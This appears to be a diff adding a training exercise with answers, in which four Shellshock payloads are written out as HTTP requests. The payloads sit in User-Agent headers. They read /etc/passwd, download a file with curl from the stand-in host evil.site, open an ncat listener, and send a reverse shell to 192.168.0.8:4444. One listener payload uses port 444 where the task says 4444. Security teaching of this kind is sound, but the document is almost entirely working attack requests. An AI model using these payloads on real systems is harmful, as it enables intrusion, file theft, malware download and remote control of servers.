@@ -1,0 +1,29 @@
+Open a text editor and write Shellshock payloads for the  tasks below. You may need to do additional research to complete the code injections.
+
+1. Read /etc/passwd.
+
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
+Connection: keep-alive
+
+2.Use curl to download a malicious file from http://evil.site/mal.php.
+
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'
+Connection: keep-alive
+
+3.Open a netcat/ncat listener on your host's port 4444.
+
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'ncat -lvp 444'
+Connection: keep-alive
+
+4. Send a reverse shell to your port 4444 (in this example, use the IP address 192.168.0.8).
+
+GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.8 4444'
+Connection: keep-alive
